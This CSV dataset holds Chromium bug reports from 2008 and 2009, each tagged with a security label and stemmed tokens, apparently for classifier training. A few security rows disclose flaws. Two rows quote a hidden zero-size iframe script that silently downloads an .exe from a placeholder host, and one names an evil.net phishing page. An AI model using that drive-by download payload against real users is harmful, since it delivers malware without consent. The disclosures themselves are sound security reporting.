Unnamed: 0,issue_id,date,report,Security,summary,description
19852,20768,1-Sep-09,Issue 20768 : Tabs don't redraw until a mouse passes over them 3     &nbsp;   palf...@gmail.com    Chrome Version : 4.0.204.0 (Developer Build Ubuntu build 24879) OS + version : Ubuntu 8.04 CPU architecture (32-bit / 64-bit): 32-bit i386 window manager : Metacity URLs (if applicable) : Behavior in Firefox 3.x (if applicable): Behavior in Chrome for Windows (optional): Tabs don't appear to properly redraw until a mouse goes over them. This is most visible when Ctrl+Tab switching  but can also be shown with mouse click switching as well. The attached video first shows issues with mouse clicking (see the grey/blue colours of the tab) and then with Ctrl+Tab switching. borked-tabs.ogv 37.9 KB &nbsp; Download ,0,"['tab', 'redraw', 'mous', 'pass', 'nbs']","['palf', 'gmail', 'com', 'chrome', 'version', 'develop', 'build', 'ubuntu', 'build', 'os', 'version', 'ubuntu', 'cpu', 'architectur', 'bit', 'bit', 'bit', 'window', 'manag', 'metac', 'url', 'applic', 'behavior', 'firefox', 'x', 'applic', 'behavior', 'chrome', 'window', 'option', 'tab', 'appear', 'proper', 'redraw', 'mous', 'goe', 'visibl', 'ctrl', 'tab', 'switch', 'also', 'shown', 'mous', 'click', 'switch', 'well', 'attach', 'video', 'first', 'show', 'issu', 'mous', 'click', 'see', 'grey', 'blue', 'colour', 'tab', 'ctrl', 'tab', 'switch', 'bork', 'tab', 'ogv', 'kb', 'nbsp', 'download']"
20084,21004,3-Sep-09,Issue 21004 : Need options to disable HTML5 database and Localstorage per-site and completely 10     &nbsp;   dhhwai    When HTML5 database and Localstorage are implemented  you will need to provide options to disable database and/or Localstorage. Options will be needed to disable them entirely  or block them per-site. (This is just the same security and privacy blocks as for cookies and Gears localserver and database.) ,0,"['need', 'option', 'disabl', 'html', 'databas', 'localstorag', 'per', 'site', 'complet', 'nbs']","['dhhwai', 'html', 'databas', 'localstorag', 'implement', 'need', 'provid', 'option', 'disabl', 'databas', 'localstorag', 'option', 'need', 'disabl', 'entir', 'block', 'per', 'site', 'secur', 'privaci', 'block', 'cooki', 'gear', 'localserv', 'databas']"
20102,21022,3-Sep-09,Issue 21022 : Omnibox font size should be larger 2     &nbsp;   shess@chromium.org    Linus has asked for the font to be larger. My research indicates that we're using the right code- paths versus Windows  and the font just isn't the same. I don't know if that has global meaning or not. ,0,"['omnibox', 'font', 'size', 'larger', 'nbs']","['shess', 'chromium', 'org', 'linus', 'ask', 'font', 'larger', 'research', 'indic', 'use', 'right', 'code', 'path', 'versus', 'window', 'font', 'know', 'global', 'mean']"
20175,21098,4-Sep-09,Issue 21098 : URL display occasionally cut off 1 person starred this issue and may be notified of changes.   &nbsp;   evan@chromium.org    Not exactly sure what causes it  but occasionally my URL bar will have everything after the first 40 characters or so cut off. Sometimes it gets cut mid-letter. It looks like it's not getting painted right  or it's getting painted over or something. Causing it to get repainted by dragging other windows over it or causing a tooltip to show does *not* fix it. Loading a different URL does *not* fix it. Clicking in the bar does fix it. I believe it only happens in the GTK theme  so I think it's some painting- related bit there  maybe related to clip regions. This happened on my Karmic-ish 32-bit laptop before and still happens now that I've reinstalled with the latest Karmic alpha. ,0,"['url', 'display', 'occasion', 'cut', 'person', 'star', 'issu', 'may', 'notifi', 'chang', 'nbs']","['evan', 'chromium', 'org', 'exact', 'sure', 'caus', 'occasion', 'url', 'bar', 'everyth', 'first', 'charact', 'cut', 'sometim', 'get', 'cut', 'mid', 'letter', 'look', 'like', 'get', 'paint', 'right', 'get', 'paint', 'someth', 'caus', 'get', 'repaint', 'drag', 'window', 'caus', 'tooltip', 'show', 'fix', 'load', 'differ', 'url', 'fix', 'click', 'bar', 'fix', 'believ', 'happen', 'gtk', 'theme', 'think', 'paint', 'relat', 'bit', 'mayb', 'relat', 'clip', 'region', 'happen', 'karmic', 'ish', 'bit', 'laptop', 'still', 'happen', 'reinstal', 'latest', 'karmic', 'alpha']"
20202,21127,4-Sep-09,Issue 21127 : REGRESSION: [ftp://ftp.ets.org/pub/demo]: FTP downloads are broken 1 person starred this issue and may be notified of changes.   &nbsp;   dhw@chromium.org    Broken out from Issue 20304 ,0,"['regress', 'ftp', 'ftp', 'et', 'org', 'pub', 'demo', 'ftp', 'download', 'broken', 'person', 'star', 'issu', 'may', 'notifi', 'chang', 'nbs']","['dhw', 'chromium', 'org', 'broken', 'issu']"
20225,21152,4-Sep-09,Issue 21152 : Expose UI for bookmark menu on all platforms 24 problem? 1. Add on terminal or direct acces: google-chrome --bookmark-menu 2. Open Chrome. 3. Bookmark menu button doesn't appear on Linux.  ? This... http://chromium.googlecode.com/issues/attachment?aid=7573081862285992196&amp;name=bookmark-menu-button.png On Windows works fine  but in Linux not.  ? Doesn't appear. Please fixed the problem  please. (Sorry for my english) ,0,"['expos', 'ui', 'bookmark', 'menu', 'platform', 'probl']","['add', 'termin', 'direct', 'acc', 'googl', 'chrome', 'bookmark', 'menu', 'open', 'chrome', 'bookmark', 'menu', 'button', 'appear', 'linux', 'aid', 'amp', 'name', 'bookmark', 'menu', 'button', 'png', 'window', 'work', 'fine', 'linux', 'appear', 'pleas', 'fix', 'problem', 'pleas', 'sorri', 'english']"
20229,21157,5-Sep-09,Issue 21157 : Flash doesn't correctly overlay content (gmail  bubbleTweet) 7     &nbsp;   pinkerton@chromium.org    - go to http://www.bubbletweet.com/showBT.php?id=e59oa - watch flash movie that plays over content expected: - movie should correctly overlay content  no black square. Actual: - black square under plug-in and on top of page content. ,0,"['flash', 'correct', 'overlay', 'content', 'gmail', 'bubbletweet', 'nbs']","['pinkerton', 'chromium', 'org', 'go', 'id', 'e', 'oa', 'watch', 'flash', 'movi', 'play', 'content', 'expect', 'movi', 'correct', 'overlay', 'content', 'black', 'squar', 'actual', 'black', 'squar', 'plug', 'top', 'page', 'content']"
20503,21459,9-Sep-09,Issue 21459 : &quot;Delete history for this day&quot; on the History tab is in a different font 3 problem? 1. Open the history tab (command-Y) 2. Look at it What is the expected output? What do you see instead? Expect: uniform type throughout Observe: The whole page is in Arial (it shouldn't be  see bug 21458 ) with the exception of the &quot;Delete history for this day&quot; links  which are in Lucida Grande The page source reveals that &quot;Delete history for this day&quot; is being fashioned out of a &lt;button&gt; that has most of its buttony appearance stripped away. On the Mac  button labels are rendered in a different font than ordinary content. Please use labels and text to provide additional information. 4.0.206.1 official release (206 branch r25349 ) 4.0.208.0 trunk r25632 ,0,"['quotdelet', 'histori', 'day', 'quo']","['histori', 'tab', 'differ', 'font', 'problem', 'open', 'histori', 'tab', 'command', 'look', 'expect', 'output', 'see', 'instead', 'expect', 'uniform', 'type', 'throughout', 'observ', 'whole', 'page', 'arial', 'see', 'bug', 'except', 'quot', 'delet', 'histori', 'day', 'quot', 'link', 'lucida', 'grand', 'page', 'sourc', 'reveal', 'quot', 'delet', 'histori', 'day', 'quot', 'fashion', 'lt', 'button', 'gt', 'buttoni', 'appear', 'strip', 'away', 'mac', 'button', 'label', 'render', 'differ', 'font', 'ordinari', 'content', 'pleas', 'use', 'label', 'text', 'provid', 'addit', 'inform', 'offici', 'releas', 'branch', 'r', 'trunk', 'r']"
20516,21473,10-Sep-09,Issue 21473 : Regression: Styles in &quot;Developer Tools&quot; don't work 2 problem? 1. Right-click anywhere on the page 2. Inspect Element 3. Try to open &quot;Styles&quot; in right-hand nav  ? Styles are shown  ? Nothing     It's a regression. It was possible to see styles before. ,0,"['regress', 'style', 'quo']","['develop', 'tool', 'quot', 'work', 'problem', 'right', 'click', 'anywher', 'page', 'inspect', 'element', 'tri', 'open', 'quot', 'style', 'quot', 'right', 'hand', 'nav', 'style', 'shown', 'noth', 'regress', 'possibl', 'see', 'style']"
20538,21499,10-Sep-09,Issue 21499 : Chrome directs loopback requests through proxy &lsaquo; Prev 7270 of 14162 Next &rsaquo; 1 person starred this issue and may be notified of changes.   &nbsp;   pawel.jasnos    Chrome Version : 3.0.195.17 (Official Build 25565) URLs (if applicable) :    : Safari 4: Firefox 3.x:OK IE 7: IE 8:OK  ? 1.Set up a proxy server. 2.Put it's address in Chrome options  ticking &quot;skip proxy for local addresses&quot;. 3.try accessing http://127.0.0.1:2345/  ? Browser skips proxy and connects to localhost  reporting error if port is closed/filtered.  ? Browser sends a request to the proxy server to fetch the page.     Operating system: Windows 7 RC ,0,"['chrome', 'direct', 'loopback', 'request', 'proxi', 'lsaqu']","['prev', 'next', 'rsaquo', 'person', 'star', 'issu', 'may', 'notifi', 'chang', 'nbsp', 'pawel', 'jasno', 'chrome', 'version', 'offici', 'build', 'url', 'applic', 'safari', 'firefox', 'x', 'ok', 'ie', 'ie', 'ok', 'set', 'proxi', 'server', 'put', 'address', 'chrome', 'option', 'tick', 'quot', 'skip', 'proxi', 'local', 'address', 'quot', 'tri', 'access', 'browser', 'skip', 'proxi', 'connect', 'localhost', 'report', 'error', 'port', 'close', 'filter', 'browser', 'send', 'request', 'proxi', 'server', 'fetch', 'page', 'oper', 'system', 'window', 'rc']"
20799,21782,14-Sep-09,Issue 21782 : Breakpad initialization synchronously calls lsb_release 1 person starred this issue and may be notified of changes.   &nbsp;   evan@chromium.org    Breakpad startup calls base::GetLinuxDistro() which calls lsb_release and waits for its output. lsb_release is a Python script  which does a gajillion stat()s and opens  many of them on NFS. % grep &quot;9893.* stat&quot; strace_log | wc -l 259 Adam said the code used to just read the file directly and only during a crash. If we must run this script  we should at least do it asynchronously (and then maybe wait for its output if we crash before we get its output). ,0,"['breakpad', 'initi', 'synchron', 'call', 'lsb', 'releas', 'person', 'star', 'issu', 'may', 'notifi', 'chang', 'nbs']","['evan', 'chromium', 'org', 'breakpad', 'startup', 'call', 'base', 'getlinuxdistro', 'call', 'lsb', 'releas', 'wait', 'output', 'lsb', 'releas', 'python', 'script', 'gajillion', 'stat', 'open', 'mani', 'nfs', 'grep', 'quot', 'stat', 'quot', 'strace', 'log', 'wc', 'l', 'adam', 'said', 'code', 'use', 'read', 'file', 'direct', 'crash', 'must', 'run', 'script', 'least', 'asynchron', 'mayb', 'wait', 'output', 'crash', 'get', 'output']"
20940,21933,15-Sep-09,Issue 21933 : Layout issue on NTP with extensions on top 2 problem? 1. Run Chrome with --show-extensions-on-top 2. Open New Tab page 3. Observe the layout issue with the extension shelf. I thought I had broken this with my theming changelist ( r26228 )  but it turns out this existed in the previous build ( r26224 ) which predated my theming change. ,0,"['layout', 'issu', 'ntp', 'extens', 'top', 'probl']","['run', 'chrome', 'show', 'extens', 'top', 'open', 'new', 'tab', 'page', 'observ', 'layout', 'issu', 'extens', 'shelf', 'thought', 'broken', 'theme', 'changelist', 'r', 'turn', 'exist', 'previous', 'build', 'r', 'predat', 'theme', 'chang']"
1192,1208,4-Sep-08,Issue 1208 : Never elide file extensions (at least in download UI) 8     &nbsp;   pkasting@chromium.org    In the download UI  and perhaps everywhere else  we should always show the file extension. Not doing so puts users at more risk from websites trying to spoof a file's type/characteristics. ,1,"['never', 'elid', 'file', 'extens', 'least', 'download', 'ui', 'nbs']","['pkast', 'chromium', 'org', 'download', 'ui', 'perhap', 'everywher', 'els', 'alway', 'show', 'file', 'extens', 'put', 'user', 'risk', 'websit', 'tri', 'spoof', 'file', 'type', 'characterist']"
1194,1210,4-Sep-08,Issue 1210 : Don't trigger buttons on second click of a double-click 5     &nbsp;   pkasting@chromium.org    Buttons should not trigger on the second click of a double-click  if the first click was not on them. This helps avoid problems where the first click on something changes the UI and places a different button under the mouse for the second click. ,1,"['trigger', 'button', 'second', 'click', 'doubl', 'click', 'nbs']","['pkast', 'chromium', 'org', 'button', 'trigger', 'second', 'click', 'doubl', 'click', 'first', 'click', 'help', 'avoid', 'problem', 'first', 'click', 'someth', 'chang', 'ui', 'place', 'differ', 'button', 'mous', 'second', 'click']"
1393,1414,5-Sep-08,Issue 1414 : Chrome Buffer Overlow Vulnerability - &quot;SaveAs&quot; Function 4     &nbsp;   s...@bkav.com.vn    SVRT - Bkis have just discovered vulnerability in Google Chrome 0.2.149.27 and would like to inform you with this. Here comes the report: Details: - Type of Issue: Buffer Overflow. - Affected Software: Google Chrome 0.2.149.27. - Exploitation Environment: Google Chrome (Language: Vietnamese) on Windows XP SP2. - Impact: Remote code execution - Description: The vulnerability is caused due to a boundary error when handling the âSaveAsâ?function. On saving a malicious page with an overly long title (&lt;title&gt; tag in HTML)  the program causes a stack-based overflow and makes it possible for attackers to execute arbitrary code on usersâ?systems. - How an attacker could exploit the issue : To exploit the Vulnerability  a hacker might construct a specially crafted Web page  which contains malicious code. He then tricks users into visiting his Website and convinces them to save this Page. Right after that  the code would be executed  giving him the privilege to make use of the affected system. - Exploitation code: Proof of Concept: Crash (Attached to this document). - Researcher: AnhLD â?SVRT member. - About SVRT : Bkis Vietnam is a security research center in Vietnam. SVRT  which is short for Security Vulnerability Research Team  is one of Bkis researching groups. SVRT specializes in the detection  alert and announcement of security vulnerabilities in software  operating systems  network protocols and embedded systems... - Contact detail: Name: Security Vulnerability Research Team. Bach Khoa Internetwork Security Center (Bkis) Hanoi University of Technology (Vietnam) Office: 5th Floor  Hitech building - 1A Dai Co Viet  Hanoi Email: svrt@bkav.com.vn WebBlog: security.bkis.vn Website: www.bkav.com.vn Chrome-Poc.html 3.5 KB &nbsp; View &nbsp; Download ,1,"['chrome', 'buffer', 'overlow', 'vulner', 'quo']","['savea', 'quot', 'function', 'nbsp', 'bkav', 'com', 'vn', 'svrt', 'bkis', 'discov', 'vulner', 'googl', 'chrome', 'would', 'like', 'inform', 'come', 'report', 'detail', 'type', 'issu', 'buffer', 'overflow', 'affect', 'softwar', 'googl', 'chrome', 'exploit', 'environ', 'googl', 'chrome', 'languag', 'vietnames', 'window', 'xp', 'sp', 'impact', 'remot', 'code', 'execut', 'descript', 'vulner', 'caus', 'due', 'boundari', 'error', 'handl', 'savea', 'function', 'save', 'malici', 'page', 'over', 'long', 'titl', 'lt', 'titl', 'gt', 'tag', 'html', 'program', 'caus', 'stack', 'base', 'overflow', 'make', 'possibl', 'attack', 'execut', 'arbitrari', 'code', 'user', 'system', 'attack', 'could', 'exploit', 'issu', 'exploit', 'vulner', 'hacker', 'might', 'construct', 'special', 'craft', 'web', 'page', 'contain', 'malici', 'code', 'trick', 'user', 'visit', 'websit', 'convinc', 'save', 'page', 'right', 'code', 'would', 'execut', 'give', 'privileg', 'make', 'use', 'affect', 'system', 'exploit', 'code', 'proof', 'concept', 'crash', 'attach', 'document', 'research', 'anhld', 'svrt', 'member', 'svrt', 'bkis', 'vietnam', 'secur', 'research', 'center', 'vietnam', 'svrt', 'short', 'secur', 'vulner', 'research', 'team', 'one', 'bkis', 'research', 'group', 'svrt', 'special', 'detect', 'alert', 'announc', 'secur', 'vulner', 'softwar', 'oper', 'system', 'network', 'protocol', 'embed', 'system', 'contact', 'detail', 'name', 'secur', 'vulner', 'research', 'team', 'bach', 'khoa', 'internetwork', 'secur', 'center', 'bkis', 'hanoi', 'univers', 'technolog', 'vietnam', 'offic', 'th', 'floor', 'hitech', 'build', 'dai', 'co', 'viet', 'hanoi', 'email', 'svrt', 'bkav', 'com', 'vn', 'webblog', 'secur', 'bkis', 'vn', 'websit', 'www', 'bkav', 'com', 'vn', 'chrome', 'poc', 'html', 'kb', 'nbsp', 'view', 'nbsp', 'download']"
1623,1647,6-Sep-08,Issue 1647 : Suggestions attempted for SSL sites 9     &nbsp;   dglead    When accessing a https site if the URL in the address bar is edited slightly then the URL is sent to the suggestion service on clients1.google.com. I don't think suggestions should be attempted for SSL sites as this could potentially send semi-sensitive URL data from a HTTPS site over plain HTTP. ,1,"['suggest', 'attempt', 'ssl', 'site', 'nbs']","['dglead', 'access', 'https', 'site', 'url', 'address', 'bar', 'edit', 'slight', 'url', 'sent', 'suggest', 'servic', 'client', 'googl', 'com', 'think', 'suggest', 'attempt', 'ssl', 'site', 'could', 'potenti', 'send', 'semi', 'sensit', 'url', 'data', 'https', 'site', 'plain', 'http']"
1733,1758,7-Sep-08,Issue 1758 : in option window -- under save password - all passwords can be seen. 1 person starred this issue and may be notified of changes.   &nbsp;   gold.dudu    this should be invisible to any user or restricted by entering password. if it is a shared computer and a user saved password by mistake at any site   other users can retrieve the password. ,1,"['option', 'window', 'save', 'password', 'password', 'seen', 'person', 'star', 'issu', 'may', 'notifi', 'chang', 'nbs']","['gold', 'dudu', 'invis', 'user', 'restrict', 'enter', 'password', 'share', 'comput', 'user', 'save', 'password', 'mistak', 'site', 'user', 'retriev', 'password']"
1760,1785,7-Sep-08,Issue 1785 : Show Password 1 person starred this issue and may be notified of changes.   &nbsp;   gustavopulgar83    Hi. I know that this isn't a bug but i believe that  if you guys wants to keep the &quot;show password&quot; stuff (i dislike this option but i'm sure you have a reason for that) perhaps you should consider setting a master password or something. Keep up the good job! ,1,"['show', 'password', 'person', 'star', 'issu', 'may', 'notifi', 'chang', 'nbs']","['gustavopulgar', 'hi', 'know', 'bug', 'believ', 'guy', 'want', 'keep', 'quot', 'show', 'password', 'quot', 'stuff', 'dislik', 'option', 'sure', 'reason', 'perhap', 'consid', 'set', 'master', 'password', 'someth', 'keep', 'good', 'job']"
1802,1827,8-Sep-08,Issue 1827 : Potential Automatic Download Annoyance 2     &nbsp;   elixer    Using a simple script: &quot; *************************************************************************** Author: nerex E-mail: nerex[at]live[dot]com Google's new Web browser (Chrome) allows files (e.g.  executables) to be automatically downloaded to the user's computer without any user prompt. This proof-of-concept was created for educational purposes only. Use the code it at your own risk. The author will not be responsible for any damages. Tested on Windows Vista SP1 and Windows XP SP3 with Google Chrome (BETA) ************************************************************************** &lt;script&gt; document.write('&lt;iframe src=&quot; http://www.example.com/hello.exe &quot; frameborder=&quot;0&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;'); &lt;/script&gt; &quot; This was found by myself at a security site. I have reproduced the &quot;bug&quot; to a degree of potential annoyance at this site: http://pages.litx.org-a.googlepages.com/test2 ,1,"['potenti', 'automat', 'download', 'annoy', 'nbs']","['elix', 'use', 'simpl', 'script', 'quot', 'author', 'nerex', 'e', 'mail', 'nerex', 'live', 'dot', 'com', 'googl', 'new', 'web', 'browser', 'chrome', 'allow', 'file', 'e', 'g', 'execut', 'automat', 'download', 'user', 'comput', 'without', 'user', 'prompt', 'proof', 'concept', 'creat', 'educ', 'purpos', 'use', 'code', 'risk', 'author', 'respons', 'damag', 'test', 'window', 'vista', 'sp', 'window', 'xp', 'sp', 'googl', 'chrome', 'beta', 'lt', 'script', 'gt', 'document', 'write', 'lt', 'ifram', 'src', 'quot', 'quot', 'framebord', 'quot', 'quot', 'width', 'quot', 'quot', 'height', 'quot', 'quot', 'gt', 'lt', 'script', 'gt', 'quot', 'found', 'secur', 'site', 'reproduc', 'quot', 'bug', 'quot', 'degre', 'potenti', 'annoy', 'site']"
1943,1971,9-Sep-08,Issue 1971 : omnibox shouldn't highlight subdomain 5 problem? 1. Navigate to any URL 2. Look at the way the omnibar highlights the URL  ? The domain name should be highlighted  but not the subdomain  ? The subdomain is highlighted     Phishing emails commonly contain links like http://yourbank.com.badsite.com/ to try to make you think it's a genuine link to yourbank.com  when in fact it's a link to badsite.com URL highlighting can make this type of misdirection obvious by highlighting the domain and not the subdomain. In the above example  only badsite.com should be highlighted  which tells the user they're not really on yourbank.com. Instead  Chrome highlights the subdomain as well  which doesn't help the user notice the misdirection. ,1,"['omnibox', 'highlight', 'subdomain', 'probl']","['navig', 'url', 'look', 'way', 'omnibar', 'highlight', 'url', 'domain', 'name', 'highlight', 'subdomain', 'subdomain', 'highlight', 'phish', 'email', 'common', 'contain', 'link', 'like', 'tri', 'make', 'think', 'genuin', 'link', 'yourbank', 'com', 'fact', 'link', 'badsit', 'com', 'url', 'highlight', 'make', 'type', 'misdirect', 'obvious', 'highlight', 'domain', 'subdomain', 'exampl', 'badsit', 'com', 'highlight', 'tell', 'user', 'realli', 'yourbank', 'com', 'instead', 'chrome', 'highlight', 'subdomain', 'well', 'help', 'user', 'notic', 'misdirect']"
1958,1987,9-Sep-08,Issue 1987 : Bug no Gerenciador de Download (PT/BR) 1 person starred this issue and may be notified of changes.   &nbsp;   dilan.nery    OlÃ¡  Estou escrevendo em protuguÃªs do brasil  pois nÃ£o escrevo em inglÃªs muito bem ^.^. Vim reportar um bug que foi descoberto  no gerenciador de downloads  como ele baixa automaticamente  se colocar um codigo malicioso como esse: &lt;script&gt; document.write('&lt;iframe src=&quot; http://www.examplo.com/virus.exe &quot; frameborder=&quot;0&quot; width=&quot;0&quot; height=&quot;0&quot;&gt;'); &lt;/script&gt; Seria possivel infectar o computador de um usuÃ¡rio sem que ele perceba. O Gerenciador de downloads deve ser configurado para perguntar ao usuÃ¡rio se deseja mesmo baixar. Com isso ele irÃ¡ ficar mais protegido. Atenciosamente  Dilan Nery Lopes ,1,"['bug', 'gerenciador', 'de', 'download', 'pt', 'br', 'person', 'star', 'issu', 'may', 'notifi', 'chang', 'nbs']","['dilan', 'neri', 'ol', 'estou', 'escrevendo', 'em', 'protugu', 'brasil', 'poi', 'n', 'escrevo', 'em', 'ingl', 'muito', 'bem', 'vim', 'reportar', 'um', 'bug', 'que', 'foi', 'descoberto', 'gerenciador', 'de', 'download', 'como', 'ele', 'baixa', 'automaticament', 'se', 'colocar', 'um', 'codigo', 'malicioso', 'como', 'ess', 'lt', 'script', 'gt', 'document', 'write', 'lt', 'ifram', 'src', 'quot', 'quot', 'framebord', 'quot', 'quot', 'width', 'quot', 'quot', 'height', 'quot', 'quot', 'gt', 'lt', 'script', 'gt', 'seria', 'possivel', 'infectar', 'computador', 'de', 'um', 'usu', 'rio', 'sem', 'que', 'ele', 'perceba', 'gerenciador', 'de', 'download', 'deve', 'ser', 'configurado', 'para', 'perguntar', 'ao', 'usu', 'rio', 'se', 'deseja', 'mesmo', 'baixar', 'com', 'isso', 'ele', 'ir', 'ficar', 'mai', 'protegido', 'atenciosament', 'dilan', 'neri', 'lope']"
2108,2139,11-Sep-08,Issue 2139 : Chrome main proces crash. All tabs/windows of chrome are closed 3 problem? 1. Open website the website above in one tab 2. Open a new window of chrome 3. close the window with the website  ? Second window still open.  ? All Chrome windows are closed  and on restart chrome asks if it should restore my tabs.     At a other PC i have tryed the same website with chrome and there it does function normally.. -- FireFox also crashes -- Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 -- -- ,1,"['chrome', 'main', 'proce', 'crash', 'tab', 'window', 'chrome', 'close', 'probl']","['open', 'websit', 'websit', 'one', 'tab', 'open', 'new', 'window', 'chrome', 'close', 'window', 'websit', 'second', 'window', 'still', 'open', 'chrome', 'window', 'close', 'restart', 'chrome', 'ask', 'restor', 'tab', 'pc', 'tri', 'websit', 'chrome', 'function', 'normal', 'firefox', 'also', 'crash', 'mozilla', 'window', 'u', 'window', 'nt', 'nl', 'rv', 'gecko', 'firefox']"
2505,2541,19-Sep-08,Issue 2541 : Opening a site using &quot;--app&quot; does not allow you to see if the site uses SSL correctly 4 problem? 1) Run Chrome using this commandline: %homepath%\AppData\Local\Google\Chrome\Application\chrome.exe -- app= http://www.evil.net/phishing.html  ? SSL status should be shown  ? There will not be an address bar. You cannot see the status of SSL - you have no idea if what you're looking at is trustworthy.     ,1,"['open', 'site', 'use', 'quo']","['app', 'quot', 'allow', 'see', 'site', 'use', 'ssl', 'correct', 'problem', 'run', 'chrome', 'use', 'commandlin', 'homepath', 'appdata', 'local', 'googl', 'chrome', 'applic', 'chrome', 'exe', 'app', 'ssl', 'status', 'shown', 'address', 'bar', 'see', 'status', 'ssl', 'idea', 'look', 'trustworthi']"
2541,2579,20-Sep-08,Issue 2579 : tab_strip_model.cc can Crash Chrome.dll 2 problem? 1. open a malformed web 2. close the tab window 3. close again the same tab window  ? the expected result is that Chrome close the tab and we canÂ´t close again the tab  ? Chrome do a Fatal Crash :) sing of error: AppName: chrome.exe AppVer: 0.0.0.0 ModName: chrome.dll 13:22 ?Â Â Â Â Â Â  Lostmon Â¦ ModVer: 0.2.149.30 Offset: 00007b1c After a several test i can reproduce it all time the function source file and function involved in crash: tab_strip_model.cc http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/tabs/tab_str ip_model.cc?view=markup&amp;pathrev=83 and the function part in the file affected is in line 561: TabContents* TabStripModel::GetContentsAt(int index) const { CHECK(ContainsIndex(index)) &lt;&lt; &quot;Failed to find: &quot; &lt;&lt; index &lt;&lt; &quot; in: &quot; &lt;&lt; count() &lt;&lt; &quot; entries.&quot;; return contents_data_.at(index)-&gt;contents; } Thnx for your time !!! Chrome.GIF 50.3 KB &nbsp; View &nbsp; Download ,1,"['tab', 'strip', 'model', 'cc', 'crash', 'chrome', 'dll', 'probl']","['open', 'malform', 'web', 'close', 'tab', 'window', 'close', 'tab', 'window', 'expect', 'result', 'chrome', 'close', 'tab', 'close', 'tab', 'chrome', 'fatal', 'crash', 'sing', 'error', 'appnam', 'chrome', 'exe', 'appver', 'modnam', 'chrome', 'dll', 'lostmon', 'modver', 'offset', 'b', 'c', 'sever', 'test', 'reproduc', 'time', 'function', 'sourc', 'file', 'function', 'involv', 'crash', 'tab', 'strip', 'model', 'cc', 'ip', 'model', 'cc', 'view', 'markup', 'amp', 'pathrev', 'function', 'part', 'file', 'affect', 'line', 'tabcont', 'tabstripmodel', 'getcontentsat', 'int', 'index', 'const', 'check', 'containsindex', 'index', 'lt', 'lt', 'quot', 'fail', 'find', 'quot', 'lt', 'lt', 'index', 'lt', 'lt', 'quot', 'quot', 'lt', 'lt', 'count', 'lt', 'lt', 'quot', 'entri', 'quot', 'return', 'content', 'data', 'index', 'gt', 'content', 'thnx', 'time', 'chrome', 'gif', 'kb', 'nbsp', 'view', 'nbsp', 'download']"
2580,2618,21-Sep-08,Issue 2618 : Web Inspector should not rely on the untrusted page to implement escapeHTML 3     &nbsp;   abarth@chromium.org    The Web Inspector relies on the untrusted page to implement escapeHTML. This is problematic because the untrusted page might not actually sanitize HTML. Proof of concept: http://crypto.stanford.edu/~abarth/research/chromium/inspectored/ This vulnerability seems harder to exploit in TOT WebKit with SquirrelFish Extreme due to some odd semantics around __defineGetter__. This will get fixed in the Great Inspector Rearchitecting  so it's not clear whether we should try to fix this issue as a one-off. ,1,"['web', 'inspector', 'reli', 'untrust', 'page', 'implement', 'escapehtml', 'nbs']","['abarth', 'chromium', 'org', 'web', 'inspector', 'reli', 'untrust', 'page', 'implement', 'escapehtml', 'problemat', 'untrust', 'page', 'might', 'actual', 'sanit', 'html', 'proof', 'concept', 'abarth', 'research', 'chromium', 'inspector', 'vulner', 'seem', 'harder', 'exploit', 'tot', 'webkit', 'squirrelfish', 'extrem', 'due', 'odd', 'semant', 'around', 'definegett', 'get', 'fix', 'great', 'inspector', 'rearchitect', 'clear', 'whether', 'tri', 'fix', 'issu', 'one']"
